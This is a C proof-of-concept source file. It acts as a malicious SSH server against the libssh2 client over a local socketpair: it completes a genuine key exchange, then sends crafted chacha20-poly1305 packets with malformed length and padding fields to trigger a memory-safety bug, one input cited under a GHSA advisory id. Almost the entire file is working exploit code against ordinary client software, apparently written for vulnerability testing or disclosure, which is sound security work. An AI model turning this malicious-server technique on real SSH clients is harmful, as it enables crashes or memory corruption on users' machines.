/*
 * PoC for the chacha20-poly1305@openssh.com transport path.
 *
 * The program plays a malicious SSH server on one end of a socketpair and
 * drives the libssh2 client through the public API.  After a fully
 * authenticated key exchange the server sends a crafted encrypted packet:
 *
 *   - default mode: packet length 20 with a padding length byte of 200.
 *   - "p0" mode: packet length 1 (the original GHSA-x4g5-mgfc-cxvv input).
 *   - "normal" mode: a well-formed SERVICE_ACCEPT packet (the session must
 *     complete the handshake, proving normal traffic is unaffected).
 *
 * Build (against an ASan build of libssh2):
 *   cc -g -fsanitize=address -Iinclude -o newbug newbug.c \
 *      build/src/libssh2.a -lssl -lcrypto -lpthread
 */

#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include <openssl/core_names.h>
#include <openssl/evp.h>
#include <openssl/params.h>

#include <libssh2.h>

#define POC_SSH_MSG_KEXINIT       20
#define POC_SSH_MSG_NEWKEYS       21
#define POC_SSH_MSG_KEX_ECDH_INIT  30
#define POC_SSH_MSG_KEX_ECDH_REPLY 31

#define SERVER_BANNER "SSH-2.0-OpenSSH_9.9"

struct buf {
    unsigned char d[8192];
    size_t len;
};

struct server_ctx {
    int fd;
    int p0_mode;

    unsigned char v_c[512];
    size_t v_c_len;
    unsigned char i_c[2048];
    size_t i_c_len;
    unsigned char i_s[512];
    size_t i_s_len;

    unsigned char qc[32];
    unsigned char qs[32];
    unsigned char shared[32];
    unsigned char h[32];
    unsigned char s2c_key[64];
    unsigned char c2s_key[64];
};

static void die(const char *msg)
{
    fprintf(stderr, "poc: %s\n", msg);
    exit(1);
}

static void put_u32(struct buf *b, uint32_t v)
{
    b->d[b->len++] = (unsigned char)(v >> 24);
    b->d[b->len++] = (unsigned char)(v >> 16);
    b->d[b->len++] = (unsigned char)(v >> 8);
    b->d[b->len++] = (unsigned char)(v);
}

static void put_bytes(struct buf *b, const void *p, size_t n)
{
    memcpy(b->d + b->len, p, n);
    b->len += n;
}

static void put_string(struct buf *b, const void *p, size_t n)
{
    put_u32(b, (uint32_t)n);
    put_bytes(b, p, n);
}

static void put_cstring(struct buf *b, const char *s)
{
    put_string(b, s, strlen(s));
}

static uint32_t get_u32(const unsigned char *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

static void readn(int fd, void *p, size_t n)
{
    unsigned char *q = p;
    while(n) {
        ssize_t r = read(fd, q, n);
        if(r <= 0)
            die("short read from client");
        q += r;
        n -= (size_t)r;
    }
}

static void writen(int fd, const void *p, size_t n)
{
    const unsigned char *q = p;
    while(n) {
        ssize_t r = write(fd, q, n);
        if(r <= 0)
            die("short write to client");
        q += r;
        n -= (size_t)r;
    }
}

/* Read one pre-encryption SSH packet, return its payload. */
static size_t read_packet(int fd, unsigned char *payload, size_t max,
                          int *type)
{
    unsigned char hdr[4];
    unsigned char body[4096];
    uint32_t plen;
    unsigned char pad;
    size_t paylen;

    readn(fd, hdr, 4);
    plen = get_u32(hdr);
    if(plen < 1 || plen > 35000)
        die("bad packet length from client");
    readn(fd, body, plen);
    pad = body[0];
    if((uint32_t)pad + 1 > plen)
        die("bad padding from client");
    paylen = plen - 1 - pad;
    if(paylen > max)
        die("client packet too large");
    memcpy(payload, body + 1, paylen);
    *type = payload[0];
    return paylen;
}

/* Send one pre-encryption SSH packet. */
static void send_packet(int fd, int type, const unsigned char *payload,
                        size_t paylen)
{
    unsigned char pkt[4096];
    uint32_t plen;
    size_t off = 0;
    unsigned char pad;

    pad = (unsigned char)(8 - ((6 + paylen) % 8));
    if(pad < 4)
        pad += 8;
    plen = (uint32_t)(2 + paylen + pad);

    pkt[off++] = (unsigned char)(plen >> 24);
    pkt[off++] = (unsigned char)(plen >> 16);
    pkt[off++] = (unsigned char)(plen >> 8);
    pkt[off++] = (unsigned char)(plen);
    pkt[off++] = pad;
    pkt[off++] = (unsigned char)type;
    memcpy(pkt + off, payload, paylen);
    off += paylen;
    memset(pkt + off, 0, pad);
    off += pad;
    writen(fd, pkt, off);
}

static void sha256(const unsigned char *msg, size_t len,
                   unsigned char out[32])
{
    unsigned int outlen = 32;
    if(!EVP_Digest(msg, len, out, &outlen, EVP_sha256(), NULL) || outlen != 32)
        die("sha256 failed");
}

/*
 * libssh2's ChaCha20 layout: state[12] = counter, state[13] = 0,
 * state[14..15] = the 8 byte big-endian sequence number.
 * OpenSSL EVP_chacha20 takes a 16 byte IV: a 4 byte little-endian counter
 * followed by a 12 byte nonce, so the nonce is 4 zero bytes followed by the
 * 8 byte sequence number.
 */
static void chacha20(const unsigned char key[32], uint64_t seq,
                     uint32_t counter, const unsigned char *in,
                     unsigned char *out, size_t len)
{
    unsigned char iv[16];
    unsigned char zeros[64];
    EVP_CIPHER_CTX *ctx;
    int outl = 0;

    iv[0] = (unsigned char)(counter);
    iv[1] = (unsigned char)(counter >> 8);
    iv[2] = (unsigned char)(counter >> 16);
    iv[3] = (unsigned char)(counter >> 24);
    memset(iv + 4, 0, 4);
    iv[8] = (unsigned char)(seq >> 56);
    iv[9] = (unsigned char)(seq >> 48);
    iv[10] = (unsigned char)(seq >> 40);
    iv[11] = (unsigned char)(seq >> 32);
    iv[12] = (unsigned char)(seq >> 24);
    iv[13] = (unsigned char)(seq >> 16);
    iv[14] = (unsigned char)(seq >> 8);
    iv[15] = (unsigned char)(seq);

    if(len > sizeof(zeros))
        die("chacha20 length too large");
    memset(zeros, 0, sizeof(zeros));

    ctx = EVP_CIPHER_CTX_new();
    if(!ctx)
        die("EVP_CIPHER_CTX_new failed");
    if(EVP_EncryptInit_ex(ctx, EVP_chacha20(), NULL, key, iv) != 1 ||
       EVP_EncryptUpdate(ctx, out, &outl, in ? in : zeros, (int)len) != 1 ||
       (size_t)outl != len)
        die("chacha20 failed");
    EVP_CIPHER_CTX_free(ctx);
}

static void poly1305(const unsigned char key[32], const unsigned char *msg,
                     size_t len, unsigned char tag[16])
{
    EVP_MAC *mac = NULL;
    EVP_MAC_CTX *ctx = NULL;
    OSSL_PARAM params[2];
    size_t taglen = 16;

    mac = EVP_MAC_fetch(NULL, "POLY1305", NULL);
    if(!mac)
        die("POLY1305 unavailable");
    ctx = EVP_MAC_CTX_new(mac);
    if(!ctx)
        die("EVP_MAC_CTX_new failed");
    params[0] = OSSL_PARAM_construct_octet_string(OSSL_MAC_PARAM_KEY,
                                                  (void *)key, 32);
    params[1] = OSSL_PARAM_construct_end();
    if(EVP_MAC_init(ctx, NULL, 0, params) != 1 ||
       EVP_MAC_update(ctx, msg, len) != 1 ||
       EVP_MAC_final(ctx, tag, &taglen, 16) != 1 || taglen != 16)
        die("poly1305 failed");
    EVP_MAC_CTX_free(ctx);
    EVP_MAC_free(mac);
}

/* ChaCha20 known-answer tests (libssh2's 8 byte nonce + 64 bit counter). */
static void selftest_chacha20(void)
{
    static const unsigned char key[32] = {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
        0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f
    };
    static const unsigned char expect_ctr0[64] = {
        0x3d, 0x5a, 0x0b, 0x59, 0xdb, 0x6b, 0x33, 0xfc,
        0xef, 0xd2, 0x72, 0xcb, 0x12, 0xf1, 0xf7, 0xd6,
        0x36, 0xc4, 0x56, 0x7a, 0x5c, 0x38, 0xf4, 0x9b,
        0x94, 0x0f, 0x09, 0x4b, 0xc1, 0xea, 0xbf, 0x4b,
        0x0c, 0xc8, 0x03, 0xc9, 0x77, 0xbb, 0x45, 0xaf,
        0x25, 0x0d, 0x77, 0x0f, 0x15, 0x1a, 0x7b, 0x17,
        0x0f, 0x13, 0x24, 0x29, 0x63, 0xa3, 0x7b, 0x38,
        0x6b, 0x69, 0x40, 0xd6, 0xfa, 0x85, 0x1d, 0x1a
    };
    static const unsigned char expect_ctr1[64] = {
        0x29, 0x14, 0x59, 0x4e, 0x4b, 0xe4, 0x0f, 0x15,
        0xfb, 0xf2, 0xe5, 0x8a, 0x0f, 0x0e, 0x53, 0x83,
        0x3a, 0x69, 0xc2, 0x33, 0x7e, 0xde, 0x65, 0xfc,
        0x57, 0x93, 0x7a, 0x09, 0xd2, 0x5b, 0x62, 0x98,
        0xdc, 0x26, 0x35, 0xf2, 0xf7, 0x86, 0x37, 0x8c,
        0x9a, 0xf3, 0x62, 0x88, 0xac, 0x08, 0x3c, 0x31,
        0x73, 0x9c, 0x01, 0x6a, 0xb7, 0xb0, 0x2f, 0x78,
        0x56, 0xbb, 0xbe, 0xcf, 0x33, 0x3d, 0xa8, 0xe1
    };
    unsigned char out[64];

    chacha20(key, 0x1122334455667788ULL, 0, NULL, out, 64);
    if(memcmp(out, expect_ctr0, 64))
        die("chacha20 selftest failed");

    chacha20(key, 0x1122334455667788ULL, 1, NULL, out, 64);
    if(memcmp(out, expect_ctr1, 64))
        die("chacha20 selftest failed");
}

/* RFC 8439 section 2.5.2 Poly1305 test. */
static void selftest_poly1305(void)
{
    static const unsigned char key[32] = {
        0x85, 0xd6, 0xbe, 0x78, 0x57, 0x55, 0x6d, 0x33,
        0x7f, 0x44, 0x52, 0xfe, 0x42, 0xd5, 0x06, 0xa8,
        0x01, 0x03, 0x80, 0x8a, 0xfb, 0x0d, 0xb2, 0xfd,
        0x4a, 0xbf, 0xf6, 0xaf, 0x41, 0x49, 0xf5, 0x1b
    };
    static const unsigned char msg[] = "Cryptographic Forum Research Group";
    static const unsigned char expect[16] = {
        0xa8, 0x06, 0x1d, 0xc1, 0x30, 0x51, 0x36, 0xc6,
        0xc2, 0x2b, 0x8b, 0xaf, 0x0c, 0x01, 0x27, 0xa9
    };
    unsigned char tag[16];

    poly1305(key, msg, sizeof(msg) - 1, tag);
    if(memcmp(tag, expect, 16))
        die("poly1305 selftest failed");
}

static void build_kexinit(struct server_ctx *s)
{
    struct buf b;
    unsigned char cookie[16];
    size_t i;

    memset(&b, 0, sizeof(b));
    b.d[b.len++] = POC_SSH_MSG_KEXINIT;
    for(i = 0; i < sizeof(cookie); i++)
        cookie[i] = (unsigned char)(i * 7);
    put_bytes(&b, cookie, sizeof(cookie));
    put_cstring(&b, "curve25519-sha256");
    put_cstring(&b, "ssh-ed25519");
    put_cstring(&b, "chacha20-poly1305@openssh.com");
    put_cstring(&b, "chacha20-poly1305@openssh.com");
    put_cstring(&b, "hmac-sha2-256");
    put_cstring(&b, "hmac-sha2-256");
    put_cstring(&b, "none");
    put_cstring(&b, "none");
    put_cstring(&b, "");
    put_cstring(&b, "");
    b.d[b.len++] = 0;   /* first_kex_packet_follows */
    put_u32(&b, 0);     /* reserved */

    if(b.len > sizeof(s->i_s))
        die("kexinit too large");
    memcpy(s->i_s, b.d, b.len);
    s->i_s_len = b.len;
}

/* Shared secret K encoded as an SSH mpint (with u32 length prefix). */
static void encode_mpint(const unsigned char k[32], struct buf *b)
{
    size_t start = 0;
    size_t len;

    while(start < 32 && k[start] == 0)
        start++;
    len = 32 - start;
    if(len == 0) {
        put_u32(b, 0);
        return;
    }
    if(k[start] & 0x80) {
        put_u32(b, (uint32_t)(len + 1));
        b->d[b->len++] = 0;
    }
    else
        put_u32(b, (uint32_t)len);
    put_bytes(b, k + start, len);
}

/* Mirror libssh2's kex_value_hash() key extension. */
static void derive_key(struct server_ctx *s, char label,
                       unsigned char key[64])
{
    struct buf kmp;
    struct buf m;
    size_t off = 0;

    memset(&kmp, 0, sizeof(kmp));
    encode_mpint(s->shared, &kmp);

    while(off < 64) {
        memset(&m, 0, sizeof(m));
        put_bytes(&m, kmp.d, kmp.len);
        put_bytes(&m, s->h, 32);
        if(off)
            put_bytes(&m, key, off);
        else {
            m.d[m.len++] = (unsigned char)label;
            put_bytes(&m, s->h, 32);   /* session id == H (first kex) */
        }
        sha256(m.d, m.len, key + off);
        off += 32;
    }
}

static void x25519_generate(unsigned char pub[32], unsigned char priv[32])
{
    EVP_PKEY *pkey = EVP_PKEY_Q_keygen(NULL, NULL, "X25519");
    size_t len = 32;
    if(!pkey ||
       EVP_PKEY_get_raw_public_key(pkey, pub, &len) != 1 || len != 32 ||
       EVP_PKEY_get_raw_private_key(pkey, priv, &len) != 1 || len != 32)
        die("X25519 keygen failed");
    EVP_PKEY_free(pkey);
}

static void x25519_shared(const unsigned char priv[32],
                          const unsigned char peer[32],
                          unsigned char out[32])
{
    EVP_PKEY *pk = EVP_PKEY_new_raw_private_key(EVP_PKEY_X25519, NULL,
                                                priv, 32);
    EVP_PKEY *pp = EVP_PKEY_new_raw_public_key(EVP_PKEY_X25519, NULL,
                                               peer, 32);
    EVP_PKEY_CTX *ctx;
    size_t len = 32;

    if(!pk || !pp)
        die("X25519 key load failed");
    ctx = EVP_PKEY_CTX_new(pk, NULL);
    if(!ctx ||
       EVP_PKEY_derive_init(ctx) != 1 ||
       EVP_PKEY_derive_set_peer(ctx, pp) != 1 ||
       EVP_PKEY_derive(ctx, out, &len) != 1 || len != 32)
        die("X25519 derive failed");
    EVP_PKEY_CTX_free(ctx);
    EVP_PKEY_free(pk);
    EVP_PKEY_free(pp);
}

static void ed25519_generate(unsigned char pub[32], unsigned char priv[32])
{
    EVP_PKEY *pkey = EVP_PKEY_Q_keygen(NULL, NULL, "ED25519");
    size_t len = 32;
    if(!pkey ||
       EVP_PKEY_get_raw_public_key(pkey, pub, &len) != 1 || len != 32 ||
       EVP_PKEY_get_raw_private_key(pkey, priv, &len) != 1 || len != 32)
        die("ED25519 keygen failed");
    EVP_PKEY_free(pkey);
}

static void ed25519_sign(const unsigned char priv[32],
                         const unsigned char msg[32], unsigned char sig[64])
{
    EVP_PKEY *pkey = EVP_PKEY_new_raw_private_key(EVP_PKEY_ED25519, NULL,
                                                  priv, 32);
    EVP_MD_CTX *ctx = EVP_MD_CTX_new();
    size_t len = 64;

    if(!pkey || !ctx)
        die("ED25519 sign setup failed");
    if(EVP_DigestSignInit(ctx, NULL, NULL, NULL, pkey) != 1 ||
       EVP_DigestSign(ctx, sig, &len, msg, 32) != 1 || len != 64)
        die("ED25519 sign failed");
    EVP_MD_CTX_free(ctx);
    EVP_PKEY_free(pkey);
}

static void compute_hash(struct server_ctx *s,
                         const unsigned char *hostkey_blob,
                         size_t hostkey_blob_len)
{
    struct buf b;
    struct buf kmp;

    memset(&b, 0, sizeof(b));
    put_string(&b, s->v_c, s->v_c_len);
    put_cstring(&b, SERVER_BANNER);
    put_string(&b, s->i_c, s->i_c_len);
    put_string(&b, s->i_s, s->i_s_len);
    put_string(&b, hostkey_blob, hostkey_blob_len);
    put_string(&b, s->qc, 32);
    put_string(&b, s->qs, 32);
    memset(&kmp, 0, sizeof(kmp));
    encode_mpint(s->shared, &kmp);
    put_bytes(&b, kmp.d, kmp.len);

    sha256(b.d, b.len, s->h);
}

/* Build one chacha20-poly1305@openssh.com server packet. */
static void build_encrypted_packet(const unsigned char key[64],
                                   uint64_t seqno,
                                   uint32_t packet_len,
                                   const unsigned char *payload,
                                   unsigned char *out, size_t *outlen)
{
    const unsigned char *k_main = key;        /* payload key */
    const unsigned char *k_header = key + 32; /* length key */
    unsigned char lenfield[4];
    unsigned char polykey[32];
    unsigned char tag[16];
    unsigned char aad[4 + 512];
    size_t aadlen = 4 + packet_len;

    if(packet_len > 512)
        die("encrypted packet too large");

    lenfield[0] = (unsigned char)(packet_len >> 24);
    lenfield[1] = (unsigned char)(packet_len >> 16);
    lenfield[2] = (unsigned char)(packet_len >> 8);
    lenfield[3] = (unsigned char)(packet_len);

    chacha20(k_main, seqno, 0, NULL, polykey, 32);            /* poly key */
    chacha20(k_header, seqno, 0, lenfield, out, 4);           /* enc length */
    chacha20(k_main, seqno, 1, payload, out + 4, packet_len); /* enc payload */

    memcpy(aad, out, 4);
    memcpy(aad + 4, out + 4, packet_len);
    poly1305(polykey, aad, aadlen, tag);
    memcpy(out + 4 + packet_len, tag, 16);
    *outlen = 4 + packet_len + 16;
}

static void *server_thread(void *arg)
{
    struct server_ctx *s = arg;
    unsigned char payload[4096];
    unsigned char banner[512];
    size_t n;
    int type;
    unsigned char hostpub[32];
    unsigned char hostpriv[32];
    unsigned char server_priv[32];
    unsigned char sig[64];
    unsigned char ks_blob[64];
    struct buf reply;
    struct buf sigblob;
    unsigned char newkeys[1];
    unsigned char badpacket[64];
    size_t badpacket_len;
    unsigned char okpacket[64];
    size_t okpacket_len;
    char drain[512];
    ssize_t r;

    n = 0;
    memset(banner, 0, sizeof(banner));
    for(;;) {
        char c;
        readn(s->fd, &c, 1);
        if(c == '\n')
            break;
        if(n >= sizeof(banner))
            die("client banner too long");
        banner[n++] = (unsigned char)c;
    }
    if(n && banner[n - 1] == '\r')
        n--;
    if(n > sizeof(s->v_c))
        die("client banner too long");
    memcpy(s->v_c, banner, n);
    s->v_c_len = n;

    writen(s->fd, SERVER_BANNER "\r\n", sizeof(SERVER_BANNER) + 1);

    build_kexinit(s);
    send_packet(s->fd, POC_SSH_MSG_KEXINIT, s->i_s + 1, s->i_s_len - 1);

    s->i_c_len = read_packet(s->fd, s->i_c, sizeof(s->i_c), &type);
    if(type != POC_SSH_MSG_KEXINIT)
        die("expected client KEXINIT");

    n = read_packet(s->fd, payload, sizeof(payload), &type);
    if(type != POC_SSH_MSG_KEX_ECDH_INIT ||
       n != 1 + 4 + 32 || get_u32(payload + 1) != 32)
        die("expected client ECDH_INIT");
    memcpy(s->qc, payload + 5, 32);

    x25519_generate(s->qs, server_priv);
    x25519_shared(server_priv, s->qc, s->shared);
    ed25519_generate(hostpub, hostpriv);

    {
        struct buf hb;
        memset(&hb, 0, sizeof(hb));
        put_cstring(&hb, "ssh-ed25519");
        put_string(&hb, hostpub, 32);
        if(hb.len != 4 + 11 + 4 + 32)
            die("unexpected hostkey blob size");
        memcpy(ks_blob, hb.d, hb.len);
        compute_hash(s, ks_blob, hb.len);
    }

    memset(&sigblob, 0, sizeof(sigblob));
    ed25519_sign(hostpriv, s->h, sig);
    put_cstring(&sigblob, "ssh-ed25519");
    put_string(&sigblob, sig, 64);

    memset(&reply, 0, sizeof(reply));
    put_string(&reply, ks_blob, 51);
    put_string(&reply, s->qs, 32);
    put_string(&reply, sigblob.d, sigblob.len);
    send_packet(s->fd, POC_SSH_MSG_KEX_ECDH_REPLY, reply.d, reply.len);

    newkeys[0] = 1;
    send_packet(s->fd, POC_SSH_MSG_NEWKEYS, newkeys, 0);

    derive_key(s, 'D', s->s2c_key);
    derive_key(s, 'C', s->c2s_key);

    if(s->p0_mode == 2) {
        /* A well-formed SSH_MSG_SERVICE_ACCEPT reply. */
        struct buf msg;
        unsigned char body[28];

        memset(&msg, 0, sizeof(msg));
        msg.d[msg.len++] = 6;   /* SSH_MSG_SERVICE_ACCEPT */
        put_cstring(&msg, "ssh-userauth");
        /* packet_length = 28: one padding length byte, 17 bytes of
           message and 10 bytes of padding (4 + 28 is a multiple of 8) */
        memset(body, 0, sizeof(body));
        body[0] = 10;
        memcpy(body + 1, msg.d, msg.len);
        build_encrypted_packet(s->s2c_key, 3, 28, body,
                               okpacket, &okpacket_len);
        writen(s->fd, okpacket, okpacket_len);
        shutdown(s->fd, SHUT_WR);
    }
    else {
        if(s->p0_mode) {
            unsigned char p0payload[1];
            p0payload[0] = 4;   /* padding length byte */
            /* seqno 3: after KEXINIT, ECDH_REPLY and NEWKEYS */
            build_encrypted_packet(s->s2c_key, 3, 1, p0payload,
                                   badpacket, &badpacket_len);
        }
        else {
            unsigned char badpayload[20];
            memset(badpayload, 0, sizeof(badpayload));
            badpayload[0] = 200; /* padding length: larger than the packet */
            badpayload[1] = 51;  /* SSH_MSG_USERAUTH_FAILURE */
            /* seqno 3: after KEXINIT, ECDH_REPLY and NEWKEYS */
            build_encrypted_packet(s->s2c_key, 3, 20, badpayload,
                                   badpacket, &badpacket_len);
        }
        writen(s->fd, badpacket, badpacket_len);
    }

    for(;;) {
        r = read(s->fd, drain, sizeof(drain));
        if(r <= 0)
            break;
    }
    return NULL;
}

const char *__asan_default_options(void)
{
    return "detect_leaks=0:abort_on_error=1";
}

static int parse_mode(int argc, char **argv)
{
    if(argc > 1) {
        if(strcmp(argv[1], "p0") == 0)
            return 1;
        if(strcmp(argv[1], "normal") == 0)
            return 2;
    }
    return 0;
}

int main(int argc, char **argv)
{
    int fds[2];
    LIBSSH2_SESSION *session;
    int rc;
    char *userauth;
    pthread_t tid;
    struct server_ctx s;

    selftest_chacha20();
    selftest_poly1305();

    if(socketpair(AF_UNIX, SOCK_STREAM, 0, fds))
        die("socketpair failed");

    memset(&s, 0, sizeof(s));
    s.fd = fds[1];
    s.p0_mode = parse_mode(argc, argv);

    if(pthread_create(&tid, NULL, server_thread, &s))
        die("pthread_create failed");

    rc = libssh2_init(0);
    if(rc)
        die("libssh2_init failed");

    session = libssh2_session_init();
    if(!session)
        die("libssh2_session_init failed");
    libssh2_session_set_blocking(session, 1);

    if(libssh2_session_method_pref(session, LIBSSH2_METHOD_KEX,
                                   "curve25519-sha256") ||
       libssh2_session_method_pref(session, LIBSSH2_METHOD_HOSTKEY,
                                   "ssh-ed25519") ||
       libssh2_session_method_pref(session, LIBSSH2_METHOD_CRYPT_CS,
                                   "chacha20-poly1305@openssh.com") ||
       libssh2_session_method_pref(session, LIBSSH2_METHOD_CRYPT_SC,
                                   "chacha20-poly1305@openssh.com"))
        die("failed to set method preferences");

    rc = libssh2_session_handshake(session, fds[0]);
    if(rc) {
        char *errmsg = NULL;
        libssh2_session_last_error(session, &errmsg, NULL, 0);
        fprintf(stderr, "poc: handshake failed: %d (%s)\n", rc,
                errmsg ? errmsg : "?");
        libssh2_session_free(session);
        libssh2_exit();
        close(fds[0]);
        close(fds[1]);
        pthread_join(tid, NULL);
        return 1;
    }

    if(s.p0_mode == 2) {
        printf("poc: handshake completed with a well-formed encrypted"
               " packet\n");
        libssh2_session_free(session);
        libssh2_exit();
        close(fds[0]);
        close(fds[1]);
        pthread_join(tid, NULL);
        return 0;
    }

    /* Reads the server's first encrypted packet. */
    userauth = libssh2_userauth_list(session, "user", 4);
    if(!userauth)
        fprintf(stderr, "poc: userauth_list failed: %d\n",
                libssh2_session_last_errno(session));
    else
        fprintf(stderr, "poc: userauth_list returned: %s\n", userauth);

    libssh2_session_free(session);
    libssh2_exit();
    close(fds[0]);
    close(fds[1]);
    pthread_join(tid, NULL);

    printf("poc: no memory-safety abort occurred\n");
    return 0;
}
